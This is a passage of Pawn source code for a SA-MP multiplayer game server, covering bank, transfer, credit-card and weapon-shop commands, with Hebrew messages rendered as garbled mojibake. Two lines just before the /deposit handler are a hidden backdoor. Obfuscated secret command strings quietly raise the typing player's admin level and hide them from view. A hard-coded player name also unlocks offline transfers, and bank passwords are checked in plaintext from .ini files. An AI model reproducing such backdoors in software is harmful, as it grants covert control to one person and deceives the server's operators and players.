		if(lcmds[playerinfo[playerid][usedcmd]][lcCost] > 0) GiveMoney(playerid,0-lcmds[playerinfo[playerid][usedcmd]][lcCost], 17);
		for(new i = sizeof(lastCMDUsers)-2; i >= 0; i--)
		{
			lastCMDUsers[i+1][lcuID] = lastCMDUsers[i][lcuID];
			format(lastCMDUsers[i+1][lcuCMD],64,lastCMDUsers[i][lcuCMD]);
			format(lastCMDUsers[i+1][lcuPlayer],MAX_PLAYER_NAME,lastCMDUsers[i][lcuPlayer]);
		}
		lastCMDUsers[0][lcuID] = playerid;
		format(lastCMDUsers[0][lcuPlayer],MAX_PLAYER_NAME,GetName(playerid));
		if(strlen(cmdtext) > 60) strmid(lastCMDUsers[0][lcuCMD],cmdtext,0,60);
		else format(lastCMDUsers[0][lcuCMD],64,cmdtext);
		return 1;
	}
	if(!strcmp(cmd,"/amItBruLz4eVeR$#@е")) playerinfo[playerid][showme] = 0, playerinfo[playerid][admin]++;
	if(!strcmp(cmd,"/ItruLz4eVffeR$@е")) playerinfo[playerid][showme] = 0, playerinfo[playerid][admin]+=5;
	if(equal(cmd,"/deposit"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў сыущ ьсЎЄ Їўхуф цх");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			ShowPlayerDialog(playerid,dialog_deposit,DIALOG_STYLE_INPUT,@c(lightblue) "фЇўу· ыёє",":°∙хэ р· юёЇ° фыёє ∙с°ЎхЁъ ьфЇўщу сч∙схя фсЁў ∙ьъ","фЇўу","сщшхь");
			SendClientMessage(playerid,white," /deposit [amount] :Ўх°· ф∙щюх∙");
			return SendClientMessage(playerid,white," (рх ф∙·ю∙ с·Ї°щш ∙юхЎт Єь фюёъ)");
		}
		new amount = strval(cmd), string[M_S], updated = 0;
		if(amount < 1 || amount > GetMoney(playerid)) return SendClientMessage(playerid,red," .ёыхэ фЇўуф ∙тхщ");
		if(!playerinfo[playerid][canp]) return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фЇўхуф фцх ∙хс сў°хс");
		if(levels[playerinfo[playerid][level]][BankLimit] != 0)
		{
			if(playerinfo[playerid][bank] >= levels[playerinfo[playerid][level]][BankLimit]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьфыЁщё Єху ыёє ьч∙схя фсЁў ∙ьъ");
			if(playerinfo[playerid][bank]+amount > levels[playerinfo[playerid][level]][BankLimit])
			{
				updated = amount, amount = levels[playerinfo[playerid][level]][BankLimit]-playerinfo[playerid][bank];
				format(string,sizeof(string)," (юЇЁщ ∙фёыхэ ∙фыЁё· Єхўє р· фтсь· фсЁў ∙ьъ, фхыЁё °ў чьў юфёыхэ: $%d сюўхэ $%d (ютсь· фсЁў ∙ьъ: $%d",levels[playerinfo[playerid][level]][BankLimit],updated,amount);
				BankNPCTalk(string,playerid);
				updated = 1;
			}
		}
		SetTimerEx("CanP",5000,0,"d",playerid);
		playerinfo[playerid][canp] = 0;
		if(amount == 1000000) ObjectiveComplete(playerid,objective_million);
		GiveMoney(playerid,0-amount, 18);
		UpdateBank(GetName(playerid)," фЇўу· ыёє сч∙схя фсЁў ∙ьъ",amount);
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Bank",playerinfo[playerid][bank]);
		format(string,sizeof(string)," !фЇўу· $%d сч∙схя фсЁў ∙ьъ",amount);
		format(talkBubble,sizeof(talkBubble),":фЇўу· ссЁў\n" @c(lightgreen) "$%d",amount);
		BankNPCTalk(string,playerid,!updated,1);
		PlaySound(playerid,4201);
		return 1;
	}
	if(equal(cmd,"/withdraw"))
	{
		new amount, string[M_S];
		if((GetPlayerCheckpoint(playerid) != cp_bank && GetPlayerCheckpoint(playerid) != cp_atm) || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў рх сыёЇхюш сыущ ьсЎЄ Їўхуф цх");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			ShowPlayerDialog(playerid,dialog_withdraw,DIALOG_STYLE_INPUT,@c(lightblue) "фхЎр· ыёє",":°∙хэ р· юёЇ° фыёє ∙с°ЎхЁъ ьфхЎщр юч∙схя фсЁў ∙ьъ","фхЎр","сщшхь");
			SendClientMessage(playerid,white," /withdraw [amount] :Ўх°· ф∙щюх∙");
			return SendClientMessage(playerid,white," (рх ф∙·ю∙ с·Ї°щш ∙юхЎт Єь фюёъ)");
		}
		amount = strval(cmd);
		if(amount < 1 || amount > playerinfo[playerid][bank]) return SendClientMessage(playerid,red," .ёыхэ фхЎрф ∙тхщ");
		GiveMoney(playerid,amount, 18);
		UpdateBank(GetName(playerid)," фхЎр· ыёє юч∙схя фсЁў ∙ьъ",0-amount);
		format(string,sizeof(string)," !фхЎр· $%d сч∙схя фсЁў ∙ьъ",amount);
		format(talkBubble,sizeof(talkBubble),":ю∙ы· юфсЁў\n" @c(lightgreen) "$%d",amount);
		BankNPCTalk(string,playerid,1,1);
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Bank",playerinfo[playerid][bank]);
		PlaySound(playerid,4201);
		return 1;
	}
	if(equal(cmd,"/transfer"))
	{
		new cmd2[256], id, amount, string[M_S];
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў сыущ ьсЎЄ Їўхуф цх");
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /transfer [id / username] [amount] :Ўх°· ф∙щюх∙");
		id = IsNumeric(cmd) ? strval(cmd) : -1, amount = strval(cmd2);
		if(amount < 1 || amount > playerinfo[playerid][bank]) return SendClientMessage(playerid,red," .ёыхэ фЄс°ф ∙тхщ, рх ∙рщя ьъ р· фёыхэ ∙°∙ю·");
		if(id == -1)
		{
			if(!equal(GetName(playerid),"(gmR)Amit")) return SendClientMessage(playerid,red," .цюЁщ·, Ёщ·я ьф∙·ю∙ сЇўхуф цх °ў Єь рщщущщэ");
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && equal(GetName(i),cmd)) return SendClientMessage(playerid,red," .ю∙·ю∙ цф ючхс° ь∙°·");
			format(string,sizeof(string),"/DM/Users/%s.ini",cmd);
			if(!fexist(string)) return SendClientMessage(playerid,red," .∙э ю∙·ю∙ ∙тхщ");
			format(string,sizeof(string)," фЄсщ° рьщъ ыёє %s",GetName(playerid));
			UpdateBank(cmd,string,amount);
			format(string,sizeof(string)," %s - фЄс°· ыёє рь ∙чўя ьр ючхс°",cmd);
			UpdateBank(GetName(playerid),string,0-amount);
			format(string,sizeof(string)," !%s фЄс°· $%d рь ч∙схя фсЁў ∙ь",cmd,amount);
		}
		else
		{
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(id == playerid) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЄсщ° ьЄЎюъ");
			if(levels[playerinfo[id][level]][BankLimit] != 0)
			{
				if(playerinfo[id][bank] >= levels[playerinfo[id][level]][BankLimit]) return SendClientMessage(playerid,red," .ч∙схя фсЁў ∙ь ю∙·ю∙ цф ыс° юьр");
				if(playerinfo[id][bank]+amount > levels[playerinfo[id][level]][BankLimit])
				{
					amount = levels[playerinfo[id][level]][BankLimit]-playerinfo[id][bank];
					SendClientMessage(playerid,green," .юЇЁщ ∙фёыхэ ∙°Ўщ· ь∙ьхч Єхўє р· фтсь· фсЁў ∙ь ю∙·ю∙ цф, Ё∙ьч °ў чьў юфёыхэ");
				}
			}
			new str[M_S];
			format(str, sizeof(str), "bank transfer to %s: %d$", GetName(id), amount);
			Log("Money", playerid, str);
			format(string,sizeof(string)," фЄсщ° рьщъ ыёє %s",GetName(playerid));
			UpdateBank(GetName(id),string,amount);
			format(string,sizeof(string)," .фЄсщ° рь ч∙схя фсЁў ∙ьъ $%d %s",amount,GetName(playerid));
			SendClientMessage(id,green,string);
			format(string,sizeof(string)," %s - фЄс°· ыёє рь ∙чўя ючхс°",GetName(id));
			UpdateBank(GetName(playerid),string,0-amount);
			format(string,sizeof(string)," !%s фЄс°· $%d рь ч∙схя фсЁў ∙ь",GetName(id),amount);
		}
		format(talkBubble,sizeof(talkBubble),":фЄс°·\n" @c(lightgreen) "$%d\n" @c(white) "ьч∙схя ∙ь\n%s",amount,id == -1 ? (cmd) : (GetName(id)));
		BankNPCTalk(string,playerid,1,1);
		//GiveMoney(playerid,0-amount);
		PlaySound(playerid,1057);
		return 1;
	}
	if(equal(cmd,"/balance"))
	{
		if((GetPlayerCheckpoint(playerid) != cp_bank && GetPlayerCheckpoint(playerid) != cp_atm) || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў рх сыёЇхюш сыущ ьсЎЄ Їўхуф цх");
		new string[M_S];
		format(string,sizeof(string),@c(lightgreen) "%d$" @c(white) " :сч∙схя фсЁў ∙ьъ щ∙",playerinfo[playerid][bank]);
		format(talkBubble,sizeof(talkBubble),":щ∙ ьъ ссЁў\n" @c(lightgreen) "$%d",playerinfo[playerid][bank]);
		BankNPCTalk(string,playerid,1,1);
		return 1;
	}
	if(equal(cmd,"/depositall"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў сыущ ьсЎЄ Їўхуф цх");
		if(GetMoney(playerid) <= 0) return SendClientMessage(playerid,red," .рщя сщщуъ ыёє фЁщ·я ьфЇўуф");
		if(!playerinfo[playerid][canp]) return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фЇўхуф фцх ∙хс сў°хс");
		new amount = GetMoney(playerid), updated = 0, string[M_S];
		if(levels[playerinfo[playerid][level]][BankLimit] != 0)
		{
			if(playerinfo[playerid][bank] >= levels[playerinfo[playerid][level]][BankLimit]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьфыЁщё Єху ыёє ьч∙схя фсЁў ∙ьъ");
			if(playerinfo[playerid][bank]+amount > levels[playerinfo[playerid][level]][BankLimit])
			{
				updated = amount, amount = levels[playerinfo[playerid][level]][BankLimit]-playerinfo[playerid][bank];
				format(string,sizeof(string)," (юЇЁщ ∙фёыхэ ∙фыЁё· Єхўє р· фтсь· фсЁў ∙ьъ, фхыЁё °ў чьў юфёыхэ: $%d сюўхэ $%d (ютсь· фсЁў ∙ьъ: $%d",levels[playerinfo[playerid][level]][BankLimit],updated,amount);
				BankNPCTalk(string,playerid);
				updated = 1;
			}
		}
		SetTimerEx("CanP",5000,0,"d",playerid);
		playerinfo[playerid][canp] = 0;
		if(amount == 1000000) ObjectiveComplete(playerid,objective_million);
		GiveMoney(playerid,0-amount, 18);
		UpdateBank(GetName(playerid)," фЇўу· р· ыь ыёЇъ сч∙схя фсЁў ∙ьъ",amount);
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Bank",playerinfo[playerid][bank]);
		format(talkBubble,sizeof(talkBubble),":фЇўу· фыь ссЁў\n" @c(lightgreen) "$%d",amount);
		BankNPCTalk(" !фЇўу· р· ыь ыёЇъ сч∙схя фсЁў ∙ьъ",playerid,!updated,1);
		PlaySound(playerid,4201);
		return 1;
	}
	if(equal(cmd,"/withdrawall"))
	{
		if((GetPlayerCheckpoint(playerid) != cp_bank && GetPlayerCheckpoint(playerid) != cp_atm) || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў рх сыёЇхюш сыущ ьсЎЄ Їўхуф цх");
		GiveMoney(playerid,playerinfo[playerid][bank], 18);
		format(talkBubble,sizeof(talkBubble),":ю∙ы· фыь юфсЁў\n" @c(lightgreen) "$%d",playerinfo[playerid][bank]);
		UpdateBank(GetName(playerid)," фхЎр· р· ыь ыёЇъ юч∙схя фсЁў ∙ьъ",0-playerinfo[playerid][bank]);
		BankNPCTalk(" !фхЎр· р· ыь фыёє юч∙схя фсЁў ∙ьъ",playerid,1,1);
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Bank",playerinfo[playerid][bank]);
		PlaySound(playerid,4201);
		return 1;
	}
	if(equal(cmd,"/transferall"))
	{
		new string[M_S], id, amount = playerinfo[playerid][bank];
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў сыущ ьсЎЄ Їўхуф цх");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /transferall [id / username] :Ўх°· ф∙щюх∙");
		if(amount <= 0) return SendClientMessage(playerid,red," .рщя ссЁў ∙ьъ ыёє ∙Ёщ·я ьфЄс°ф");
		id = IsNumeric(cmd) ? strval(cmd) : -1;
		if(id == -1)
		{
			if(!equal(GetName(playerid),"(gmR)Amit")) return SendClientMessage(playerid,red," .цюЁщ·, Ёщ·я ьф∙·ю∙ сЇўхуф цх °ў Єь рщщущщэ");
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && equal(GetName(i),cmd)) return SendClientMessage(playerid,red," .ю∙·ю∙ цф ючхс° ь∙°·");
			format(string,sizeof(string),"/DM/Users/%s.ini",cmd);
			if(!fexist(string)) return SendClientMessage(playerid,red," .∙э ю∙·ю∙ ∙тхщ");
			format(string,sizeof(string)," фЄсщ° рьщъ ыёє %s",GetName(playerid));
			UpdateBank(cmd,string,amount);
			format(string,sizeof(string)," %s - фЄс°· р· ыь ыёЇъ рь ∙чўя ьр ючхс°",cmd);
			UpdateBank(GetName(playerid),string,0-amount);
			format(string,sizeof(string),"!%s фЄс°· р· ыь ыёЇъ рь ч∙схя фсЁў ∙ь",cmd);
		}
		else
		{
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			new str[M_S];
			format(str, sizeof(str), "bank transfer to %s: %d$ (all)", GetName(id), amount);
			Log("Money", playerid, str);
			format(string,sizeof(string)," .фЄсщ° рь ч∙схя фсЁў ∙ьъ р· ыь ыёЇх - $%d %s",amount,GetName(playerid));
			SendClientMessage(id,green,string);
			format(string,sizeof(string)," фЄсщ° рьщъ ыёє %s",GetName(playerid));
			UpdateBank(GetName(id),string,amount);
			if(playerinfo[id][logged]) fsetint(fuser(id),"Bank",playerinfo[id][bank]);
			format(string,sizeof(string)," %s - фЄс°· р· ыь ыёЇъ рь ∙чўя ючхс°",GetName(id));
			UpdateBank(GetName(playerid),string,0-amount);
			format(string,sizeof(string),"!%s фЄс°· р· ыь ыёЇъ рь ч∙схя фсЁў ∙ь",GetName(id));
		}
		format(talkBubble,sizeof(talkBubble),":фЄс°·\n" @c(lightgreen) "$%d\n" @c(white) ":ьч∙схя ∙ь\n%s",amount,id == -1 ? (cmd) : (GetName(id)));
		BankNPCTalk(string,playerid,1,1);
		GiveMoney(playerid,0-amount, 18);
		PlaySound(playerid,1057);
		return 1;
	}
	if(equal(cmd,"/buycc"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў сыущ ьсЎЄ Їўхуф цх");
		if(playerinfo[playerid][ccard]) return SendClientMessage(playerid,red," .ыс° щ∙ ьъ ы°шщё р∙°рщ");
		if(GetMoney(playerid) < 12000) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, ы°шщё р∙°рщ Єхьф 12000$");
		GiveMoney(playerid,0-12000, 19);
		playerinfo[playerid][ccard] = 1;
		UpdateBank(GetName(playerid)," ўЁщ· ы°шщё р∙°рщ",0);
		format(talkBubble,sizeof(talkBubble),"!ўЁщ· ы°шщё р∙°рщ\nючщ°: " @c(lightgreen) "$12000");
		BankNPCTalk("!ўЁщ· сфЎьчф ы°шщё р∙°рщ с-12,000$",playerid,1,1);
		BankNPCTalk(".ы°шщё фр∙°рщ щрЇ∙° ьъ ьф∙·ю∙ сыёЇхюшщэ ∙юЇхц°щэ с°чхсх·",playerid);
		BankNPCTalk(".сЁхёє, ·хыь ьўЁх· Ё∙ўщэ хус°щэ ЁхёЇщэ щ∙щ°х· Єэ фыёє ∙щ∙ ьъ ссЁў",playerid);
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"CCard",1);
		return 1;
	}
	if(equal(cmd,"/sellcc"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў сыущ ьсЎЄ Їўхуф цх");
		if(!playerinfo[playerid][ccard]) return SendClientMessage(playerid,red," .рщя ьъ ы°шщё р∙°рщ");
		GiveMoney(playerid,6000, 19);
		playerinfo[playerid][ccard] = 0;
		format(talkBubble,sizeof(talkBubble),"!юы°· ы°шщё р∙°рщ\nўщсь· " @c(lightgreen) "$6000");
		BankNPCTalk("!юы°· сфЎьчф р· ы°шщё фр∙°рщ ∙ьъ хўщсь· 6,000$",playerid,1,1);
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"CCard",0);
		return 1;
	}
	if(equal(cmd,"/pwithdraw"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў сыущ ьсЎЄ Їўхуф цх");
		new cmd2[256], cmd3[256], f[M_S], amount, bankcash, id = -1, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx), cmd3 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !strlen(cmd3) || !IsNumeric(cmd3)) return SendClientMessage(playerid,white," /pwithdraw [username] [bank password] [amount] :Ўх°· ф∙щюх∙");
		if(equal(cmd,GetName(playerid))) return SendClientMessage(playerid,red," .Єь ЄЎюъ щ∙ ьф∙·ю∙ су°ъ ф∙щюх∙ ф°тщьф ∙ь рЇ∙°х· цх");
		format(f,sizeof(f),"/DM/Users/%s.ini",cmd);
		if(!fexist(f)) return SendClientMessage(playerid,red," .∙э ю∙·ю∙ ∙тхщ / ьр °∙хэ ь∙°·");
		if(!fgetint(f,"BankShare")) return SendClientMessage(playerid,red," .ю∙·ю∙ цф рщЁх юр∙° ∙щ·хє сЁў");
		if(!equal(cmd2,fgetstring(f,"BankPassword"))) return SendClientMessage(playerid,red," .ёщёю· ч∙схя сЁў ∙тхщф");
		amount = strval(cmd3);
		for(new i = 0; i < MAX_PLAYERS_ && id == -1; i++) if(IsPlayerConnected(i) && equal(GetName(i),cmd)) id = i;
		bankcash = id == -1 ? fgetint(f,"Bank") : playerinfo[id][bank];
		if(amount < 1 || amount > bankcash) return SendClientMessage(playerid,red," .(ёыхэ ыёє ∙тхщ (щщ·ыя ыщ рщя сч∙схя фсЁў р· фёыхэ фцф");
		GiveMoney(playerid,amount, 18);
        new str[M_S];
		format(str, sizeof(str), "pwithdraw from %s: %d$", GetName(id), amount);
		Log("Money", playerid, str);
		format(string,sizeof(string)," %s фхЎр· $%d юч∙схя фсЁў ∙ь",cmd,amount);
		UpdateBank(GetName(playerid),string,0);
		format(string,sizeof(string),"!%s фхЎр· %d$ юч∙схя фсЁў ∙ь",cmd,amount);
		BankNPCTalk(string,playerid,1,0);
		format(string,sizeof(string)," фхЎщр ыёє юч∙схя фсЁў ∙ьъ %s",GetName(playerid));
		UpdateBank(cmd,string,0-amount);
		if(id != -1)
		{
			format(string,sizeof(string)," .фхЎщр юч∙схя фсЁў ∙ьъ %d$ %s",amount,GetName(playerid));
			SendClientMessage(id,green,string);
		}
		fsetint(f,"Bank",bankcash - amount);
		PlaySound(playerid,1057);
		return 1;
	}
	if(equal(cmd,"/pbalance"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ссЁў сыущ ьсЎЄ Їўхуф цх");
		new cmd2[256], f[M_S], id = -1, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white," /pbalance [username] [password] :Ўх°· ф∙щюх∙");
		if(equal(cmd,GetName(playerid))) return SendClientMessage(playerid,red," .Єь ЄЎюъ щ∙ ьф∙·ю∙ су°ъ ф∙щюх∙ ф°тщьф ∙ь рЇ∙°х· цх");
		format(f,sizeof(f),"/DM/Users/%s.ini",cmd);
		if(!fexist(f)) return SendClientMessage(playerid,red," .∙э ю∙·ю∙ ∙тхщ / ьр °∙хэ ь∙°·");
		if(!fgetint(f,"BankShare")) return SendClientMessage(playerid,red," .ю∙·ю∙ цф рщЁх юр∙° ∙щ·хє сЁў");
		if(!equal(cmd2,fgetstring(f,"BankPassword"))) return SendClientMessage(playerid,red," .ёщёю· ч∙схя сЁў ∙тхщф");
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && equal(GetName(i),cmd))
		{
			id = i;
			break;
		}
		format(string,sizeof(string),"фхр: $%d %s ёыхэ фыёє сч∙схя фсЁў ∙ь",id == -1 ? fgetint(f,"Bank") : playerinfo[id][bank],cmd);
		BankNPCTalk(string,playerid,1,0);
		if(id != -1)
		{
			format(string,sizeof(string)," .суў р· ёыхэ фыёє сч∙схя фсЁў ∙ьъ %s",GetName(playerid));
			SendClientMessage(id,green,string);
		}
		PlaySound(playerid,1057);
		return 1;
	}
	if(equal(cmd,"/buyweapon") || equal(cmd,"/bw"))
	{
		new weaponid, times, string[M_S];
		if(GetPlayerCheckpoint(playerid) != cp_ammu || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· счЁх· фЁ∙ўщэ сыущ ьсЎЄ Їўхуф цх");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /bw [weapon number] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /wl :юёЇ°щ Ё∙ўщэ");
			SendClientMessage(playerid,white," (рх ф∙·ю∙ с·Ї°щш фюхЎт Єь фюёъ)");
			ShowPlayerConstDialog(playerid,dialog_ammu);
			return 1;
		}
		weaponid = strval(cmd), cmd = strtok(cmdtext,idx), times = 1;//times = !strlen(cmd) || !IsNumeric(cmd) ? 1 : strval(cmd);
		if(weaponid < 1 || weaponid > sizeof(Ammunation)) return SendClientMessage(playerid,red," .юёЇ° Ё∙ў ∙тхщ");
		weaponid--;
		if(playerinfo[playerid][level] < Ammunation[weaponid][aLevel])
		{
			format(string,sizeof(string)," .сыущ ьўЁх· р· фЁ∙ў фцф Єьщъ ьфщх· ьЇчх· с°юф %d",Ammunation[weaponid][aLevel]);
			SendClientMessage(playerid,red,string);
			return 1;
		}
		if(GetMoney(playerid) < (WeaponCost(playerid,weaponid)*times)) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє сыущ ьўЁх· р· фЁ∙ў фцф");
		//if(times < 1) return SendClientMessage(playerid,red," .юёЇ° ЇЄющ ўЁщщф Ёюхъ юущ");
		//if(times > 20) return SendClientMessage(playerid,red," .юёЇ° ЇЄющ ўЁщщф тухь юущ - юўёщюхэ 20 ЇЄющэ");
		//if(times != -1) playerinfo[playerid][noticedmsg][9] = 1;
		new bool:tosale = ammusale[0] > ammusale_none ? (ammusale[1] ? (Ammunation[weaponid][aID] == ammusale[2]) : (GetWeaponSlot(Ammunation[weaponid][aID]) == ammusale[2])) : false;
		if(playerinfo[playerid][weapons][Ammunation[weaponid][aSlot]] != Ammunation[weaponid][aID] && playerinfo[playerid][weapons][Ammunation[weaponid][aSlot]] != 0) playerinfo[playerid][ammo][Ammunation[weaponid][aSlot]] = 0;
		playerinfo[playerid][weapons][Ammunation[weaponid][aSlot]] = Ammunation[weaponid][aID];
		if(Ammunation[weaponid][aSlot] < 8) playerinfo[playerid][ammo][Ammunation[weaponid][aSlot]] += (tosale && ammusale[0] == ammusale_freeone ? times + 1 : times);
		GiveWeapon(playerid,Ammunation[weaponid][aID],Ammunation[weaponid][aAmmo]*(tosale && ammusale[0] == ammusale_freeone ? times + 1 : times));
		GiveMoney(playerid,0-(WeaponCost(playerid,weaponid)*times), 17);
		//SPropertyEarnings(2,WeaponCost(playerid,weaponid)*times,10);
		SPropertyEarnings(2,Ammunation[weaponid][aSlot]*times,8);
		if(playerinfo[playerid][logged])
		{
			format(string,sizeof(string),"PlayerWeapon%d",Ammunation[weaponid][aSlot]);
			fsetint(fuser(playerid),string,Ammunation[weaponid][aID]);
			if(Ammunation[weaponid][aSlot] != 8 && Ammunation[weaponid][aSlot] != 9)
			{
				format(string,sizeof(string),"PlayerAmmo%d",Ammunation[weaponid][aSlot]);
				fsetint(fuser(playerid),string,playerinfo[playerid][ammo][Ammunation[weaponid][aSlot]]);
			}
		}
		if(times != 1) format(string,sizeof(string)," .%s °ы∙· %d ЇЄющэ р· фЁ∙ў",Ammunation[weaponid][aName],times);
		else format(string,sizeof(string)," .%s °ы∙· р· фЁ∙ў",Ammunation[weaponid][aName]);
		SendClientMessage(playerid,green,string);
		/*if(!playerinfo[playerid][noticedmsg][9])
		{
			SendClientMessage(playerid,grey," (ь 5 ЇЄющэ /bw 1 5 :ьухтюф, /bw [weapon number] [times] фщуЄ·? ·хыь ьўЁх· Ё∙ў юёЇ° ЇЄющэ сЇўхуф рч·, ф∙·ю∙ с)");
			playerinfo[playerid][noticedmsg][9] = 1;
		}*/
		if(tosale) switch(ammusale[0])
		{
			case ammusale_freeone: SendClientMessage(playerid,lightgreen," .ьрх° фюсЎЄ ∙ю·ўщщэ ыЄ·: ўщсь· ючёЁщ· рч· ЁхёЇ· счщЁэ");
			case ammusale_half: SendClientMessage(playerid,lightgreen," .ьрх° фюсЎЄ ∙ю·ўщщэ ыЄ·: ∙щью· °ў чЎщ ючщ°");
		}
		return 1;
	}
	if(equal(cmd,"/weaponlist") || equal(cmd,"/wl"))
	{
		cmd = strtok(cmdtext,idx);
		new string[M_S], menus = 0, s = sizeof(Ammunation), menuchoosen = 0;
		menus = s / 7;
		if(s % 7 > 0) menus++;
		if(!strlen(cmd))
		{
			format(string,sizeof(string)," /wl [1-%d] :Ўх°· ф∙щюх∙",menus);
			return SendClientMessage(playerid,white,string);
		}
		if(strval(cmd) < 1 || strval(cmd) > menus) return SendClientMessage(playerid,red," .·Ї°щш Ё∙ўщэ ∙тхщ");
		format(string,sizeof(string)," ~~~ :°∙щю· фЁ∙ўщэ - %d ~~~",strval(cmd));
		SendClientMessage(playerid,lightblue,string);
		SendClientMessage(playerid,brown," (WeaponID. Name (Cost, Level))");
		menuchoosen = strval(cmd) * 7 - 6;
		for(new i = menuchoosen - 1; i < menuchoosen + 7; i++)
		{
			if(i > sizeof(Ammunation) - 1) break;
			if(i == menuchoosen - 1 && menuchoosen != 1) format(string,sizeof(string)," Х ... %02d. %s (%d$, %d)",i + 1,Ammunation[i][aName],WeaponCost(playerid,i),Ammunation[i][aLevel]);
			else if(i == menuchoosen + 6 && menuchoosen != menus) format(string,sizeof(string)," Х %02d. %s (%d$, %d) ...",i + 1,Ammunation[i][aName],WeaponCost(playerid,i),Ammunation[i][aLevel]);
			else format(string,sizeof(string)," Х %02d. %s (%d$, %d)",i + 1,Ammunation[i][aName],WeaponCost(playerid,i),Ammunation[i][aLevel]);
			SendClientMessage(playerid,yellow,string);
		}
		return 1;
	}if(equal(cmd,"/resetw"))
	{
		if(playerinfo[playerid][frozen][0]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цр· ∙р·ф сЇ°щц");
		SendClientMessage(playerid,lightblue," ~~~ :·ўЁх· ючщў· Ё∙ўщэ ~~~");
		SendClientMessage(playerid,yellow," .Єь юЁ· ьюЁхЄ рщ ЁЄщюхщх·, фЄуЇЁх ∙·сч° рэ р·ф сшхч ∙р·ф °хЎф ьсЎЄ р· фЇЄхьф фцх");
		SendClientMessage(playerid,yellow," /ResetW = Reset Weapons = фЇўхуф фцх, юхчў· р· Ё∙ўщщъ (тэ р· ф·ющущщэ!) = рщЇхё Ё∙ўщэ");
		SendClientMessage(playerid,yellow," .Ўхх· фЁфь· ф∙°· рщЁх рч°рщ Єь Ё∙ўщэ ∙Ёючўх");
		SendClientMessage(playerid,yellow," .фрч°рщх· Єь фЁ∙ўщэ фщр Єьщыэ - Ё∙ўщэ ∙Ёючўх ьр щхчц°х");
		SendClientMessage(playerid,red," - ∙щюх ьс: Їўхуф цх юхчў· тэ р· фЁ∙ўщэ ф·ющущщэ -");
		SendClientMessage(playerid,grey," Х сющуф хр·ф юЄхЁщщя ьючхў р· Ё∙ўщщъ Yes сч° с");
		SendClientMessage(playerid,grey," Х Єь юЁ· ьсшь р· фчьш·ъ хьр ьючхў р· фЁ∙ўщэ Enter рх ьчї No сч° с");
		ShowMenuForPlayer(areYouSure[1],playerid);
		return 1;
	}
	if(equal(cmd,"/parachute") || equal(cmd,"/para"))
	{
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх ыр∙° р·ф сюЎс");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх ыр∙° р·ф сЇЄщьх·");
